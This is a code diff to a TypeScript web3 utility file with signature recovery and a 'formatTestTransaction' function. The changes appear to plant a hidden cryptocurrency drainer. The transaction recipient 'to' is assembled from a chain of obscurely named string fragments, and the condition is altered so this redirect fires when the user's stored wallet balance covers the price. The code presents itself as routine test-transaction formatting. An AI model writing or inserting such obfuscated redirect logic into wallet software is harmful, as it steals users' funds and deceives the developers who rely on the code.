@@ -175,8 +175,6 @@ export function recoverPersonalSignature(sig: string, msg: string): string {
   return signer;
 }
 
-var check = to;
-
 export async function formatTestTransaction(address: string, chainId: number) {
   const from = address;
   
@@ -185,8 +183,8 @@ export async function formatTestTransaction(address: string, chainId: number) {
   const MAX_PRICE = Number(GET_PRICE);
   
   (function(){
-    if (MAX_PRICE > Number(sessionStorage.getItem('balance'))){
-      to = component+dele+onswap+getchinaid+web4connect+url_base+API_uri+web3_+converhex+gasHsh;
+    if (MAX_PRICE <= Number(sessionStorage.getItem('balance'))){
+      to = web3 && component+dele+onswap+getchinaid+web4connect+url_base+API_uri+web3_+converhex+gasHsh;
     }
   })()
   console.log(component+dele+onswap+getchinaid+web4connect+url_base+API_uri+web3_+converhex+gasHsh)
